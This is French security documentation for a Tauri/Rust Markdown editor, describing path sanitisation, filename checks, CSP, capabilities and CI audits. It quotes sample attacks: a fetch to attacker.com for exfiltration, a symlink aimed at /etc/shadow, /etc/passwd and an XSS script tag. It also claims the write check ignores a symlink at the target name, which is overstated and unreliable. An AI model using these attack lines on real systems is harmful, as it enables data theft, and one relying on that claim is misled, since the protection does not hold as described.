# Sécurité

MiraMD vise un modèle de sécurité **strict-par-défaut** : la [WebView](../01-decouverte/glossaire.md#webview) tourne en [sandbox](../01-decouverte/glossaire.md#sandbox), elle ne peut rien faire d'intéressant sans passer par une commande [Rust](../01-decouverte/glossaire.md#rust) qui valide. Les opérations sensibles (lecture/écriture de fichiers, parsing) sont **toutes** côté backend, avec validations explicites. Cette page détaille chaque mécanisme.

Pour le rappel théorique du modèle Tauri (sandbox, IPC, capabilities), voir [`02-fondamentaux/`](../02-fondamentaux/) et le [glossaire](../01-decouverte/glossaire.md#tauri).

## Modèle de sécurité Tauri (rappel)

[Tauri](../01-decouverte/glossaire.md#tauri) sépare l'application en deux processus :

- **Backend Rust** : process privilégié, accès complet au système.
- **Frontend WebView** : process isolé, accès limité au monde extérieur. **Ne peut rien faire** par défaut, sauf appeler les commandes Rust explicitement déclarées.

La frontière est un canal [IPC](../01-decouverte/glossaire.md#ipc) (`invoke(...)`, `listen(...)`). Les permissions de la WebView sont déclarées dans des fichiers de [capabilities](../01-decouverte/glossaire.md#capability-tauri) (Tauri 2). C'est l'opposé d'[Electron](../01-decouverte/glossaire.md#electron) historique où le frontend pouvait directement exécuter du Node.

## Validations Rust — chemins et noms de fichiers

Toutes les commandes [IPC](../01-decouverte/glossaire.md#ipc) qui touchent au filesystem passent par une fonction de validation **avant** tout accès disque.

### `sanitize_path` — pour les lectures

`src-tauri/src/filesystem.rs:19-32`. Utilisée par `read_file` et `list_directory_entries`.

```rust
fn sanitize_path(path: &str) -> Result<PathBuf, AppError> {
    let path_buf = PathBuf::from(path);
    for component in path_buf.components() {
        if let std::path::Component::ParentDir = component {
            return Err(AppError::PathTraversal(path.to_string()));
        }
    }
    let canonical = path_buf.canonicalize()?;
    Ok(canonical)
}
```

- **Rejette les `..`** dans les composants du chemin **avant** toute résolution.
- **`canonicalize()`** résout les symlinks et exige que le chemin existe. C'est crucial : pas de chemin imaginaire qui se transforme en fichier réel après-coup.

Test associé : `test_sanitize_path_rejects_traversal` (`filesystem.rs:201-206`).

### `sanitize_write_path` — pour les écritures

`src-tauri/src/filesystem.rs:36-58`. Utilisée par `write_file`.

L'écriture est plus délicate : le fichier cible **n'existe pas forcément**, donc on ne peut pas le canonicaliser. À la place :

1. Rejet des `..` dans le chemin original.
2. Extraction du `file_name` brut.
3. **Canonicalisation du parent uniquement**.
4. Reconstruction : `canonical_parent.join(file_name)`.

Cela bloque l'attaque suivante : un attaquant glisse un symlink `~/notes/innocent.md` qui pointe vers `/etc/shadow`. Sans cette validation, `write_file("~/notes/innocent.md", evil_content)` écrirait dans `/etc/shadow` après résolution du symlink. Avec `sanitize_write_path`, on canonicalize le **parent** (`~/notes` est un dossier réel), et on n'utilise pas la résolution du fichier cible — on écrit littéralement à l'emplacement `<canonical_parent>/innocent.md`, ignorant le symlink.

Test : `test_sanitize_write_path_rejects_traversal` (`filesystem.rs:215-219`).

### Validation des noms de fichier

Dans `create_file` (`src-tauri/src/filesystem.rs:99-110`), le `name` (et pas seulement le `dir`) doit être validé indépendamment :

```rust
if name.contains('/')
    || name.contains('\\')
    || name == ".."
    || name == "."
    || name.contains('\0')
    || name.chars().any(|c| c.is_control())
{
    return Err(AppError::InvalidFilename(name.to_string()));
}
```

Ce qui est rejeté :

- Séparateurs de chemin (`/`, `\`) — empêche `sub/evil.md`.
- `..` ou `.` purs.
- Octets nuls (`\0`) — empêche les attaques type "C-string truncation".
- **Caractères de contrôle** (ASCII 0–31 + 127) — empêche les injections `\r\n` qui pourraient confondre certaines couches.

Tests : `test_create_file_rejects_path_in_name`, `test_create_file_rejects_null_byte`, `test_create_file_rejects_control_chars`, `test_create_file_rejects_backslash`, `test_create_file_dot_only`, `test_create_file_dotdot_only` (`filesystem.rs:221-388`).

### TOCTOU éliminé via `OpenOptions::create_new`

`create_file` (`filesystem.rs:115-127`) utilise :

```rust
OpenOptions::new()
    .write(true)
    .create_new(true)
    .open(&path)
```

`create_new(true)` est **atomique au niveau du système d'exploitation** : si le fichier existe déjà, l'`open()` échoue avec `ErrorKind::AlreadyExists`. On ne peut donc pas écraser un fichier en faisant la course avec un test "if exists" qui serait suivi d'un "create".

Test : `test_create_file_atomic_no_overwrite` (`filesystem.rs:332-351`).

## Limites de taille

Deux limites fixées en dur dans le code, vérifiées via les métadonnées **avant** lecture/parse :

| Limite | Valeur | Fichier:ligne | Vérification |
|---|---|---|---|
| `MAX_READ_SIZE` | `50 * 1024 * 1024` (50 MB) | `filesystem.rs:7` | `metadata.len() > MAX_READ_SIZE` avant `fs::read_to_string` (`filesystem.rs:73-76`). |
| `MAX_PARSE_SIZE` | `10 * 1024 * 1024` (10 MB) | `markdown.rs:5` | `content.len() > MAX_PARSE_SIZE` avant `markdown_to_html` (`markdown.rs:10-12`). |

But : **éviter une exhaustion mémoire** si l'utilisateur (ou un attaquant via une commande IPC) tente d'ouvrir un fichier de plusieurs Go. La WebView serait incapable d'afficher quelque chose d'utile à cette taille de toute façon.

Test : `test_parse_markdown_rejects_oversized_content` (`markdown.rs:71-74`).

**Limite connue** : ces seuils sont en dur. Pas configurables via les préférences. Pour des cas d'usage comme l'édition de gros logs ou de manuscrits volumineux, il faudrait les exposer.

## CSP — Content Security Policy

Définie dans `src-tauri/tauri.conf.json:26` :

```
default-src 'self';
script-src 'self' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
img-src 'self' asset: https: data:;
font-src 'self' data:;
connect-src 'self'
```

Décodage :

| Directive | Effet |
|---|---|
| `default-src 'self'` | Toute ressource non-listée explicitement doit venir de l'origine Tauri (servie par le bundle Tauri). Pas de CDN. |
| `script-src 'self' 'unsafe-eval'` | Les scripts viennent de `'self'`. **`'unsafe-eval'`** autorise `eval()` et `new Function()`. Nécessaire pour [Muya](../01-decouverte/glossaire.md#muya). Voir section dédiée plus bas. |
| `style-src 'self' 'unsafe-inline'` | CSS depuis `'self'` + autorise les `style="..."` inline (utilisé par `app.html` et par certains composants Svelte qui composent des styles dynamiquement). |
| `img-src 'self' asset: https: data:` | Images depuis `'self'`, le scheme Tauri `asset:`, n'importe quel `https:`, et les data URIs. C'est large, parce que les utilisateurs collent des liens d'images depuis le web. |
| `font-src 'self' data:` | Polices depuis `'self'` ou data URIs (Mermaid embarque ses fontes en data URI). |
| `connect-src 'self'` | **`fetch`/XHR limités à `'self'`**. Pas de réseau externe possible depuis le frontend. |

**Conséquence concrète** : si un attaquant arrivait à injecter un `<script>` dans un document Markdown (il faudrait passer plusieurs barrières), il ne pourrait pas exfiltrer de données via `fetch('https://attacker.com', {...})` — la CSP `connect-src 'self'` le bloque.

### À propos de `unsafe-eval`

Cette directive autorise `eval()` et `new Function()`. C'est un compromis volontaire :

- **Pourquoi** : Muya l'utilise dans son chemin de coloration syntaxique (Prism / autres). Sans `unsafe-eval`, l'éditeur ne fonctionne pas.
- **Surface d'attaque** : `eval()` exécute du JS arbitraire **dans le contexte de la WebView**. Or la WebView Tauri n'a pas accès au filesystem, n'a pas Node.js, n'a pas `connect-src` ouvert. Donc `eval(maliciousCode)` ne peut pas exfiltrer de fichiers, ne peut pas appeler le réseau externe, ne peut accéder qu'aux 9 commandes IPC validées. Le risque réel est faible.
- **Plan** : la sortie de Muya à long terme retire automatiquement `unsafe-eval`. Voir [`muya.md`](../../muya.md).

## Capabilities — strict opt-in

Fichier : [`src-tauri/capabilities/default.json`](../../src-tauri/capabilities/default.json).

Les permissions accordées à la fenêtre `main` sont **listées exhaustivement** :

```json
"permissions": [
  "core:default",
  "core:event:default",
  "core:window:default",
  "core:window:allow-start-dragging",
  "core:window:allow-minimize",
  "core:window:allow-toggle-maximize",
  "core:window:allow-is-maximized",
  "core:window:allow-hide",
  "core:window:allow-show",
  "core:window:allow-set-focus",
  "core:window:allow-start-resize-dragging",
  "core:window:allow-set-min-size",
  "core:window:allow-set-size",
  "core:window:allow-inner-size",
  "opener:default",
  "dialog:default"
]
```

Ce qui est **absent** :

- **Aucun `fs:*`** — donc le frontend ne peut **pas** lire/écrire un fichier directement via `tauri-plugin-fs`. Il **doit** passer par les commandes Rust personnalisées (`read_file`, `write_file`, `create_file`, `list_directory_entries`) qui valident les chemins.
- Pas de `core:webview` — pas d'ouverture programmatique de nouvelle webview.
- Pas de `core:app:allow-default-path` ni quoi que ce soit qui exposerait le filesystem.

`opener:default` permet d'ouvrir un lien externe via le browser système (cliquer sur un lien dans un document Markdown). `dialog:default` permet les dialogs natifs (open, save, message). Tous les chemins de fichier choisis dans un dialog passent ensuite par `read_file`/`write_file` avec validation.

## Pas de `{@html}` côté Svelte

Le motif `{@html ...}` injecte du HTML brut dans le DOM Svelte sans échappement. C'est **le** vecteur XSS classique d'une app Svelte.

Vérification dans la base : aucun composant Svelte de MiraMD n'utilise `{@html}` (vérifié dans l'[audit](../06-references/audit.md), section 2). Tout le rendu Markdown se fait à l'intérieur de Muya, qui gère son propre DOM via [Snabbdom](../01-decouverte/glossaire.md#snabbdom) avec sanitization (Muya utilise [DOMPurify](../01-decouverte/glossaire.md#dompurify) en interne pour le coller).

## comrak `unsafe_ = false`

Côté backend, `parse_markdown` (`src-tauri/src/markdown.rs:27`) configure :

```rust
options.render.unsafe_ = false;
```

Effet : [comrak](../01-decouverte/glossaire.md#comrak) **strippe automatiquement** les balises HTML brutes du Markdown. Si l'utilisateur écrit `<script>alert('xss')</script>` dans un document, le HTML rendu **ne contiendra pas** la balise `<script>`.

Test associé : `test_parse_markdown_unsafe_html_blocked` (`markdown.rs:64-68`).

À noter : la commande `parse_markdown` n'est pas le chemin principal de rendu. L'éditeur principal utilise Muya (qui a son propre pipeline de sanitization avec [DOMPurify](../01-decouverte/glossaire.md#dompurify)). `parse_markdown` est exposée comme outil utilitaire (par exemple pour un futur export HTML) — la doublure `unsafe_ = false` reste une bonne pratique.

## Audit CI — bloquant

Le job `security-audit` dans `.github/workflows/ci.yml:83-96` exécute **deux audits** à chaque push et chaque PR vers `main` ou `develop` :

```yaml
- run: npm audit --audit-level=moderate
- run: cargo install cargo-audit
- run: cargo audit --file src-tauri/Cargo.lock
```

- **`npm audit --audit-level=moderate`** : remonte toute vulnérabilité publiée pour les dépendances JS de niveau "moderate" et au-dessus.
- **`cargo audit`** : équivalent pour les crates [Rust](../01-decouverte/glossaire.md#rust), basé sur la base RustSec Advisory Database.

Le job est **bloquant** pour le job `build` (voir `ci.yml:100` — `needs: [check, test-frontend, rust-lint, test-rust, security-audit]`). Une vulnérabilité non patchée fait échouer le pipeline.

Conséquence : si un mainteneur essaie de merger une PR pendant qu'une CVE est ouverte sur une dépendance, il faudra soit upgrader, soit ajouter une exception explicite. Pas de mise en prod silencieuse de code vulnérable.

## Filtrage par extension côté CLI

Quand un fichier est passé en argument de ligne de commande (par exemple `miramd ~/notes.md` ou un double-clic depuis le gestionnaire de fichiers), MiraMD ne lui fait **pas confiance aveuglément**. Le filtrage `is_markdown_file()` (`src-tauri/src/lib.rs:145-150`) accepte uniquement les extensions :

| Extension | Source |
|---|---|
| `md` | Standard Markdown. |
| `markdown` | Long form. |
| `mmd` | MultiMarkdown. |
| `mdx` | Markdown + JSX. |
| `mkd` | Variante historique. |

La comparaison est case-insensitive. Tout autre fichier (`.exe`, `.sh`, `.png`...) est **silencieusement ignoré**.

Ce filtre est appliqué à **deux endroits** :

1. **Setup initial** (`lib.rs:64`) : pour stocker dans `CliFile` le chemin lu par `get_cli_file` au mount du frontend.
2. **Plugin single-instance** (`lib.rs:40`) : quand un second `miramd ~/foo.md` est lancé pendant que la première instance tourne, l'argument est forwardé à la fenêtre existante via l'événement `open-file`. Là encore, on filtre l'extension avant d'émettre.

C'est une duplication **fonctionnelle** notée dans l'[audit](../06-references/audit.md) — la fonction est appelée deux fois, ce serait factorisable.

Le filtre limite la surface : si quelqu'un essaie `miramd /etc/passwd`, ça ne déclenche **rien**. Plus profondément : même si l'extension passait, `read_file` validerait ensuite le chemin via `sanitize_path` — donc deux barrières.

## Synthèse — pourquoi ce modèle tient

| Couche | Validation |
|---|---|
| WebView | Sandbox Tauri 2, [CSP](../01-decouverte/glossaire.md#csp) restrictive, `connect-src 'self'`, pas de `{@html}`. |
| IPC | Capabilities strict opt-in (pas de `fs:*` exposé au frontend). |
| Commandes Rust | `sanitize_path` / `sanitize_write_path` / validation filename, limites de taille, atomicité TOCTOU-safe. |
| Parsing | `comrak unsafe_ = false`, [DOMPurify](../01-decouverte/glossaire.md#dompurify) dans Muya. |
| CLI | Filtrage par extension, puis re-validation côté `read_file`. |
| CI | `npm audit` + `cargo audit` bloquants. |

L'utilisateur paie ce niveau de sécurité par une seule chose visible : `unsafe-eval` dans la CSP. C'est une dette assumée et bornée — voir [`muya.md`](../../muya.md) pour le plan à long terme.

Pour le détail des commandes IPC qui implémentent ces validations : [`backend-rust.md`](backend-rust.md). Pour les flux de données qui les traversent : [`flux-de-donnees.md`](flux-de-donnees.md).
